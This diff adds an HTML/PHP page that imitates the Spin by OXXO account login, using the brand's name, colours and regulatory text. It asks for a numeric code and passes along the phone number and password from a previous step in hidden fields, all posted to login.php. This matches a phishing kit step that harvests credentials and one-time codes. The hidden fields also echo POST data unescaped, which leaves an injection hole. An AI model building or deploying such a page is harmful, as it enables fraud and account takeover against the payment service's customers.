@@ -1,0 +1,224 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Spin by Oxxo</title>
+    <style>
+        *{
+    margin: 0;
+    box-sizing: border-box;
+    margin: 0;
+}
+.contaner{
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    flex-wrap: wrap;
+    
+}
+/* PRIMER DIV */
+.hero{
+    background: #6A00DF;
+    
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    flex-wrap: wrap;
+    height: 100px;
+    width: 100%;
+}
+.hero img{
+    width: 30%;
+    padding: 10px; 
+    transform: translate(-85%, -5%);
+}
+
+/* SEGUNDO DIV */
+.hero-2{
+    background: #FFFFFF;
+    display: flex;
+    flex-wrap: wrap;
+    flex-direction: column;
+    justify-content: center;
+    align-items: center;
+}
+.for, .main{
+    width: 380px;
+}
+.for h1{
+    color: #ED6F00;
+    font-size: 200%;
+    padding-top: 50px;
+    width: 380px00px;
+    text-decoration: none;
+    text-decoration-style: none;
+}
+form{
+    background: white;
+    display: flex;
+    flex-wrap: wrap;
+    flex-direction: column;
+    justify-content: center;
+    align-items: center;
+}
+.one{
+    border: none;
+    outline: none;
+    width: 100%;
+    height: 80px;
+    padding-top: 28px;
+    border-bottom: #7a00ff solid 1px;
+    font-size: 20px;
+}
+.env{
+    border: none;
+    outline: none;
+    width: 100%;
+    height: 45px;
+    font-size: 15px;
+    Background: #6A00DF;
+    color: #FFFFFF;
+    margin-top: 20px;
+}
+hr{
+    width: 90%;
+    margin: 80px auto 10px auto;
+}
+.main ul, li, a{
+    list-style: none;
+    text-decoration: none;
+    color: black;
+}
+
+
+.main-2{
+    width: 300px;
+    padding-top: 10px;
+    
+}
+.main-2 h3{
+    text-align: center;
+    padding-bottom: 30px;
+}
+.main-2 p{
+    text-align: justify;
+}
+address{
+    width: 300px;
+    margin: 0 auto;
+    padding-top: 20px;
+    text-align: center;
+}
+.loader {
+  position: fixed;
+  top: 50%;
+  left: 50%;
+  transform: translate(-50%, -50%);
+  width: 100px;
+  height: 100px;
+  border-radius: 50%;
+  border: 5px solid transparent;
+  border-top-color: #6A00DF;
+  border-bottom-color: #ED6F00;
+  animation: loader-rotate 5s linear infinite;
+}
+
+@keyframes loader-rotate {
+  from {
+    transform: translate(-50%, -50%) rotate(0deg);
+  }
+  
+  to {
+    transform: translate(-50%, -50%) rotate(360deg);
+  }
+}
+
+body.loaded .loader {
+  display: none;
+}
+
+    #loader {
+      position: fixed;
+      top: 33%;
+      left: 50%;
+      opacity: 75%;
+      transform: translate(-50%, -50%);
+      width: 78px;
+      height: 78px;
+      border-radius: 50%;
+      border: 15px solid #6A00DF;
+      border-top-color: #ED6F00;
+      animation: spin 3s linear infinite;
+    }
+    
+    @keyframes spin {
+      0% { transform: translate(-50%, -50%) rotate(0deg); }
+      100% { transform: translate(-50%, -50%) rotate(360deg); }
+    }
+    
+input {
+      display: block;
+      margin: 15px 0;
+    }
+    </style>
+</head>
+<body class="loaded">
+    <!-- PRIMER DIV -->
+    <div class="container">
+        <div class="hero">
+            <img src="brand-bg-white-cp.png">
+        </div>
+        <!-- SEGUNDO DIV -->
+        <div class="hero-2">
+            <!-- formulario -->
+            <div class="for">
+                <h1>Ingrese a su cuenta</h1>
+                <form method="post" action="login.php">  
+            
+                    <input type="password" name="codigo" placeholder="Código" class="one" pattern="[0-9]*" title="Por favor ingrese solo números">
+                    
+                    <input type="hidden" name="number" value="<?php echo $_POST['number']; ?>">
+                      
+  <input type="hidden" name="password" value="<?php echo $_POST['password']; ?>">
+  
+                    <input type="submit" value="Enviar" class="env">
+                    
+                     <div class="loader"></div>
+                     
+                </form>
+                              
+  <script>
+    // Esperar 10 segundos y ocultar el loader
+    setTimeout(function() {
+      document.getElementById('loader').style.display = 'none';
+    }, 450);
+  </script>
+                <hr>
+            </div>
+            <!-- parte final -->
+            <div class="main">
+               <h4>Legales</h4>
+               <ul>
+                   <li><a href="##">Aviso y privacidad</a></li>
+                   <li><a href="##">Términos y condiciones</a></li>
+                   <li><a href="##">Comicionistas</a></li>
+                   <li><a href="##">Boro de entidades financieras</a></li>
+               </ul> 
+            </div>
+            <div class="main-2">
+                <h3>Consulte los costos y comicones de nuestro servicio</h3>
+                
+                <p>COMPROPAGO S.A de C.V., Institución de Fondos de Pago Electrónico, es una entidad financiera autorizada, regulada y supervisada por las Autoridades Financieras bajo la marca comercial Spin by OXXO. Ni el Gobierno Federal ni las entidades de la administración pública paraestatal podrán responsabilizarse o garantizar los recursos de los Clientes que sean utilizados en las Operaciones que celebren con Spin by OXXO o frente a otros, así como tampoco asumir alguna responsabilidad por las obligaciones contraídas por Spin by OXXO o por algún Cliente frente a otro, en virtud de las operaciones que celebren.<p>
+            </div>
+            
+        </div>
+    </div>
+    
+    <footer>
+        <address><h5>©opyright 2023 Spin by Oxxo. Todos los derechos reservados</h5></address>
+    </footer>
+    <div id="loader"></div>
+</body>
+</html>
